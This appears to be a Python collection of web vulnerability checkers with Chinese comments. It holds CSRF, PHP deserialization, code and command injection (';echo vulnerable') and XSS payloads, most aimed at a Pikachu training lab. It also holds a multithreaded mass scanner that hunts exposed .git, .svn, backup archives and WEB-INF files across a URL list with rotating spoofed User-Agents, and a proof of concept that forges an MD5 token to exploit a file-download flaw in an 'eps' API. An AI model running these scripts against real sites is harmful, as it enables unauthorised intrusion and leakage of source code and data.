import urllib.parse
from bs4 import BeautifulSoup
import random
from multiprocessing.dummy import Pool as ThreadPool
import requests
import urllib
import hashlib
from colorama import Fore
'''
测试：
    print(check_csrf_get('http://192.168.1.192:8086/pikachu/vul/csrf/csrfget/csrf_get_login.php'))
    print(check_csrf_post('http://192.168.1.192:8086/pikachu/vul/csrf/csrfpost/csrf_post_login.php'))
    print(check_csrf_token('http://192.168.1.192:8086/pikachu/vul/csrf/csrftoken/token_get_login.php'))
'''


def build_payloads_get(url, payload, session):
    # 编码参数
    encoded_params = urllib.parse.urlencode(payload)

    # 将查询参数附加到URL中
    full_url = url + '?' + encoded_params

    # 发送GET请求
    response = session.get(full_url)
    return response


def build_payloads_post(url, payload, session):
    # 发送POST请求
    response = session.post(url, data=payload)

    return response


def getParameter(url, data, session):
    response = session.get(url)
    # 使用 BeautifulSoup 解析页面
    soup = BeautifulSoup(response.content, "html.parser")

    # 查找所有的表单
    forms = soup.find_all("form")

    # 遍历每个表单，获取参数
    name = []
    value_t = []
    for form in forms:
        # 查找表单中的所有输入元素
        inputs = form.find_all("input")

        for input in inputs:
            # 获取输入元素的 name 属性值
            param = input.get("name")

            if param:
                # 获取输入元素的 value 属性值
                value = input.get("value")
                if value is None:
                    value = data

                if param != "submit" and param != "token":
                    value = data

                print("表单参数:", param)
                print("参数值:", value)

                name.append(param)
                value_t.append(value)

    return name, value_t


def checkResponseForString(response, data):
    if data in response.text:
        print("字符串 '{}' 存在于响应中".format(data))
        return True
    else:
        print("字符串 '{}' 不存在于响应中".format(data))
        return False


def check_csrf_get(url):
    data = 'check_csrf_get'
    # 构建payload
    payload_login = {
        'username': 'lili',
        'password': '123456',
        'submit': 'Login'
    }

    # 打印payload
    print("Payload:", payload_login)
    # 创建会话对象
    session = requests.Session()

    # 编码参数
    encoded_params = urllib.parse.urlencode(payload_login)

    # 将查询参数附加到URL中
    full_url = url + '?' + encoded_params

    # 发送GET请求
    response = session.get(full_url)
    url_edit = 'http://192.168.1.192:8086/pikachu/vul/csrf/csrfget/csrf_get_edit.php'
    # 检查登录是否成功
    if response.status_code == 200:
        # 获取表单参数和值
        name, value_t = getParameter(url_edit, data, session)
        # 构建payload
        payload = {}
        for i in range(len(name)):
            payload[name[i]] = value_t[i]

        # 打印payload
        print("Payload:", payload)
        # 构建payload并发送GET请求
        response = build_payloads_get(url_edit, payload, session)

        # 处理响应数据
        if response.status_code == 200:
            # 提取需要的数据或进行其他操作
            return checkResponseForString(response, data)
        else:
            return '访问受保护页面失败'
    else:
        return '登录失败'


def check_csrf_post(url):
    data = 'check_csrf_post'
    # 构建payload
    payload_login = {
        'username': 'lili',
        'password': '123456',
        'submit': 'Login'
    }

    # 打印payload
    print("Payload:", payload_login)
    # 创建会话对象
    session = requests.Session()

    # 编码参数
    encoded_params = urllib.parse.urlencode(payload_login)

    # 将查询参数附加到URL中
    full_url = url + '?' + encoded_params

    # 发送GET请求
    response = session.get(full_url)
    url_edit = 'http://192.168.1.192:8086/pikachu/vul/csrf/csrfpost/csrf_post_edit.php'
    # 检查登录是否成功
    if response.status_code == 200:
        # 获取表单参数和值
        name, value_t = getParameter(url_edit, data, session)
        # 构建payload
        payload = {}
        for i in range(len(name)):
            payload[name[i]] = value_t[i]

        # 打印payload
        print("Payload:", payload)
        # 构建payload并发送POST请求
        response = build_payloads_post(url_edit, payload, session)

        # 处理响应数据
        if response.status_code == 200:
            # 提取需要的数据或进行其他操作
            return checkResponseForString(response, data)
        else:
            return '访问受保护页面失败'
    else:
        return '登录失败'


def check_csrf_token(url):
    data = 'check_csrf_get_token'
    # 构建payload
    payload_login = {
        'username': 'lili',
        'password': '123456',
        'submit': 'Login'
    }

    # 打印payload
    print("Payload:", payload_login)
    # 创建会话对象
    session = requests.Session()

    # 编码参数
    encoded_params = urllib.parse.urlencode(payload_login)

    # 将查询参数附加到URL中
    full_url = url + '?' + encoded_params

    # 发送GET请求
    response = session.get(full_url)
    url_edit = 'http://192.168.1.192:8086/pikachu/vul/csrf/csrftoken/token_get_edit.php'
    # 检查登录是否成功
    if response.status_code == 200:
        # 获取表单参数和值
        name, value_t = getParameter(url_edit, data, session)
        # 构建payload
        payload = {}
        for i in range(len(name)):
            payload[name[i]] = value_t[i]

        # 打印payload
        print("Payload:", payload)
        # 构建payload并发送POST请求
        response = build_payloads_get(url_edit, payload, session)

        # 处理响应数据
        if response.status_code == 200:
            # 提取需要的数据或进行其他操作
            return checkResponseForString(response, data)
        else:
            return '访问受保护页面失败'
    else:
        return '登录失败'



def PHP_Dvul(url, payload):
    # 构造恶意的序列化数据
    serialized_payload = {}
    serialized_payload['o'] = payload
    # 发送请求并观察响应
    session1 = requests.Session()
    response = session1.post(url, data=serialized_payload)
    response.encoding = 'UTF-8'
    # 检查响应中是否存在反序列化漏洞的迹象
    if 'phpvul' in response.text:
        print("该网址存在 PHP 反序列化漏洞！")
    else:
        print("该网址没有 PHP 反序列化漏洞。")


# 调用函数进行测试
'''
 url = 'http://192.168.249.131/pikachu/vul/unserilization/unser.php'
    payload = 'O:1:"S":1:{s:4:"test";s:6:"phpvul";}'
    PHP_Dvul(url, payload)
'''


def remotecode(url):
    # 检测RCE漏洞的Payload
    data ={
        'txt':'phpinfo();',
        'submit':'提交'
    }
    header = {
        'Cookie': 'PHPSESSID=5r1bk8gn8nnipo6jnoaipg2tm3; security=impossible',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
    }
    # 发送请求，注入Payload，并检查响应中是否包含漏洞标识
    response = requests.post(url=url,data = data,headers =header )
    #response = requests.get(url + payload, timeout=5)
    data ={
        'txt': 'hello',
        'submit': '提交'
    }
    response2 = requests.post(url=url, data=data, headers=header)
    if response.text != response2.text:
        print("存在远程代码执行漏洞")
    else:
        print("网站安全")

def remotecommand(url):
    # 检测RCE漏洞的Payload
    data ={
        'ipaddress':';echo vulnerable',
        'submit':'ping'
    }
    header = {
        'Cookie': 'PHPSESSID=5r1bk8gn8nnipo6jnoaipg2tm3; security=impossible',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
    }
    # 发送请求，注入Payload，并检查响应中是否包含漏洞标识
    response = requests.post(url=url,data = data,headers =header )
    #response = requests.get(url + payload, timeout=5)
    if 'vulnerable' in response.text:
        print('网站存在Remote Command Executation 漏洞')
    else:
        print('网站安全')


'''

# 要检测的目标网站URL
target_url = 'http://192.168.1.192:8086/pikachu/vul/rce/rce_ping.php'

# 调用函数进行漏洞检测
check_rce_vulnerability(target_url)
'''


def build_payloads_get(url, payload):
    # 编码参数
    encoded_params = urllib.parse.urlencode(payload)

    # 将查询参数附加到URL中
    full_url = url + '?' + encoded_params

    # 发送GET请求
    response = requests.get(full_url)
    return response

def build_payloads_post(url, payload):
    # 发送POST请求
    response = requests.post(url, data=payload)

    return response

def getParameter(url, data):
    response = requests.get(url)
    # 使用 BeautifulSoup 解析页面
    soup = BeautifulSoup(response.content, "html.parser")

    # 查找所有的表单
    forms = soup.find_all("form")

    # 遍历每个表单，获取参数
    for form in forms:
        # 查找表单中的所有输入元素
        inputs = form.find_all("input")
        name = []
        value_t = []
        # 打印表单参数及其值
        for input in inputs:
            # 获取输入元素的 name 属性值
            param = input.get("name")
            if param:
                # 获取输入元素的 value 属性值
                value = input.get("value")
                if value is None:
                    value = data
                print("表单参数:", param)
                print("参数值:", value)
                name.append(param)
                value_t.append(value)
    return name, value_t

def checkResponseForString(response, data):
    if data in response.text:
        print("字符串 '{}' 存在于响应中".format(data))
        return True
    else:
        print("字符串 '{}' 不存在于响应中".format(data))
        return False

def check_xss_get_relected(url):
    data = '<script>alert(1)</script>'
    # 获取表单参数和值
    name, value_t = getParameter(url, data)
    # 构建payload
    payload = {}
    for i in range(len(name)):
        payload[name[i]] = value_t[i]

    # 打印payload
    print("Payload:", payload)
    # 构建payload并发送GET请求
    response = build_payloads_get(url, payload)

    print(checkResponseForString(response, data))

def check_xss_post_reflected(url):
    payload_login = {
        'username': 'admin',
        'password': '123456',
        'submit': 'Login'
    }
    # 创建会话对象
    session = requests.Session()

    # 发送登录请求，获取并保存 Cookie
    response = session.post(url, data=payload_login)
    data = '<script>alert(document.cookie)</script>'
    data_url = 'http://192.168.1.192:8086/pikachu/vul/xss/xsspost/xss_reflected_post.php'
    # 检查登录是否成功
    if response.status_code == 200:
        # 使用已保存的 Cookie 发送其他请求
        payload = {'message': '<script>alert(document.cookie)</script>', 'submit': 'submit'}
        response = session.post(data_url, data=payload)

        # 处理响应数据
        if response.status_code == 200:
            # 提取需要的数据或进行其他操作
            return checkResponseForString(response, data)
        else:
            return '访问受保护页面失败'
    else:
        return '登录失败'

def check_xss_stored(url):
    data = '<script>alert(document.cookie)</script>';
    # 构建查询参数
    payload = {'message': '<script>alert(document.cookie)</script>', 'submit': 'submit'}
    # 构建payload并发送GET请求
    response = build_payloads_post(url, payload)

    print(checkResponseForString(response, data))

def check_xss_filterate(url):
    data = '<a herf="#" onclick="alert(document.cookie)">';
    # 获取表单参数和值
    name, value_t = getParameter(url, data)
    # 构建payload
    payload = {}
    for i in range(len(name)):
        payload[name[i]] = value_t[i]

    # 打印payload
    print("Payload:", payload)
    # 构建payload并发送GET请求
    response = build_payloads_get(url, payload)

    print(checkResponseForString(response, data))

def check_xss_htmlspecialchars(url):
    data = "#' onclick='alert(document.cookie)'"
    # 获取表单参数和值
    name, value_t = getParameter(url, data)
    # 构建payload
    payload = {}
    for i in range(len(name)):
        payload[name[i]] = value_t[i]

    # 打印payload
    print("Payload:", payload)
    # 构建payload并发送GET请求
    response = build_payloads_get(url, payload)

    print(checkResponseForString(response, data))

def check_xss_herf(url):
    data = "javascript:alert(document.cookie)"
    # 获取表单参数和值
    name, value_t = getParameter(url, data)
    # 构建payload
    payload = {}
    for i in range(len(name)):
        payload[name[i]] = value_t[i]

    # 打印payload
    print("Payload:", payload)
    # 构建payload并发送GET请求
    response = build_payloads_get(url, payload)

    print(checkResponseForString(response, data))

def check_xss_js(url):
    data = "';alert(1);//"
    # 获取表单参数和值
    name, value_t = getParameter(url, data)
    # 构建payload
    payload = {}
    for i in range(len(name)):
        payload[name[i]] = value_t[i]

    # 打印payload
    print("Payload:", payload)
    # 构建payload并发送GET请求
    response = build_payloads_get(url, payload)

    print(checkResponseForString(response, data))

'''
    check_xss_get_relected('http://192.168.1.192:8086/pikachu/vul/xss/xss_reflected_get.php')
    check_xss_post_reflected('http://192.168.1.192:8086/pikachu/vul/xss/xsspost/post_login.php')
    check_xss_stored('http://192.168.1.192:8086/pikachu/vul/xss/xss_stored.php')
    check_xss_filterate('http://192.168.1.192:8086/pikachu/vul/xss/xss_01.php')
    check_xss_htmlspecialchars('http://192.168.1.192:8086/pikachu/vul/xss/xss_02.php')
    check_xss_herf('http://192.168.1.192:8086/pikachu/vul/xss/xss_03.php')
    check_xss_js('http://192.168.1.192:8086/pikachu/vul/xss/xss_04.php')
'''


list_rar = list(set([i.replace("\n","") for i in open("rar.txt","r").readlines()]))
houzui = ['.rar','.zip','.tar','.tar.bz2','.sql','.7z','.bak','.txt']
headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"
]

def scan(urlx):
    UA = random.choice(headerss)
    headers = {'User-Agent': UA}
    url1 = urlx + '/.svn/entries'
    try:
        r = requests.head(url=url1, headers=headers, timeout=5)
        print(r.url + " : " + str(r.status_code))
        if r.status_code == 200:
            try:
                r1 = requests.get(url=url1, headers=headers, timeout=5)
                if 'dir' in r1.content and 'svn' in r1.content:
                    with open('svn.txt', 'a+') as a:
                        a.write(url1 + '\n')
                else:
                    pass
            except Exception as e:
                pass
        else:
            pass
    except Exception as e:
        print(e)

    url2 = urlx + '/.git/config'
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r3 = requests.head(url=url2, headers=headers, timeout=5)
        print(r3.url + " : " + str(r3.status_code))
        if r3.status_code == 200:
            try:
                r4 = requests.get(url=url2, headers=headers, timeout=5)
                if 'repositoryformatversion' in r4.content:
                    with open('git.txt', 'a+') as aa:
                        aa.write(url2 + '\n')
                else:
                    pass
            except Exception as e:
                pass
        else:
            pass
    except Exception as e:
        pass

    url_3 = urlx + '/' + urlx.split(".", 2)[1]
    for x in houzui:
        url3 = url_3 + str(x)
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r5 = requests.head(url=url3, headers=headers, timeout=5)
            print(r5.url + ' : ' + str(r5.status_code) + ' : ' + str(r5.headers["Content-Length"]))
            try:
                if int(r5.headers["Content-Length"]) > 188888:
                    with open('backup.txt', 'a+') as aaa:
                        aaa.write(url3 + '\n')
                else:
                    pass
            except Exception as e:
                pass
        except Exception as e:
            pass

    for x in list_rar:
        url4 = urlx + x.replace('\n', '')
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r6 = requests.head(url=url4, headers=headers, timeout=5)
            print(r6.url + " : " + str(r6.status_code) + ' : ' + str(r6.headers["Content-Length"]))
            try:
                if int(r6.headers["Content-Length"]) > 188888:
                    with open('backup.txt', 'a+') as aaa:
                        aaa.write(url4 + '\n')
                else:
                    pass
            except Exception as e:
                pass
        except Exception as e:
            pass

    url5 = urlx + '/WEB-INF/web.xml'
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        r7 = requests.head(url=url5, headers=headers, timeout=5)
        print(r7.url + " : " + str(r7.status_code))
        if r7.status_code == 200:
            try:
                r8 = requests.get(url=url5, headers=headers, timeout=5)
                if '<web-app' in r8.content:
                    with open('webinf.txt', 'a+') as aa:
                        aa.write(url5 + '\n')
                else:
                    pass
            except Exception as e:
                pass
        else:
            pass
    except Exception as e:
        pass


smxc = int(input(str('设置扫描线程数(10-500):')))
url_list = list(set([i.replace("\n", "") for i in open("url.txt", "r").readlines()]))
pool = ThreadPool(processes=smxc)  # 线程数量
result = pool.map(scan, url_list)
pool.close()
pool.join()
'''
代码的具体功能如下：
通过读取文件 "url.txt"，将其中的URL列表加载到内存中。
设置线程池的线程数量。
针对每个URL，创建一个线程，使用随机选择的User-Agent头部发送HTTP请求。
对每个URL执行以下操作：
检查是否存在 ".svn/entries" 文件，如果存在且内容中包含 "dir" 和 "svn" 字符串，则将该URL记录在名为 "svn.txt" 的文件中。
检查是否存在 ".git/config" 文件，如果存在且内容中包含 "repositoryformatversion" 字符串，则将该URL记录在名为 "git.txt" 的文件中。
使用不同的文件扩展名（如".bak"、".zip"等），构建新的URL，发送请求并检查响应的内容长度是否大于188,888字节。如果满足条件，则将该URL记录在名为 "backup.txt" 的文件中。
检查是否存在 "WEB-INF/web.xml" 文件，如果存在且内容中包含 "<web-app" 字符串，则将该URL记录在名为 "webinf.txt" 的文件中。
'''

head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
}


def md5encode(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/downloadsecretKeyIbuilding"
    else:
        path = "/eps/api/resourceOperations/downloadsecretKeyIbuilding"
    encodetext = url + path
    input_name = hashlib.md5()
    input_name.update(encodetext.encode("utf-8"))
    return input_name.hexdigest().upper()


def download(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/download?token="
    else:
        path = "/eps/api/resourceOperations/download?token="
    pocurl = url + path + md5encode(url)
    data = {
        "service": urllib.parse.quote(url + "/home/index.action")
    }
    try:
        response = requests.post(url=pocurl, headers=head, data=data, verify=False, timeout=3)
        if response.status_code == 200:
            print(Fore.GREEN + f"[+]{url}存在文件下载漏洞！！！！")
        else:
            print(Fore.RED + f"[-]{url}不存在文件下载漏洞")
    except:
        pass


'''
download(input_url)
'''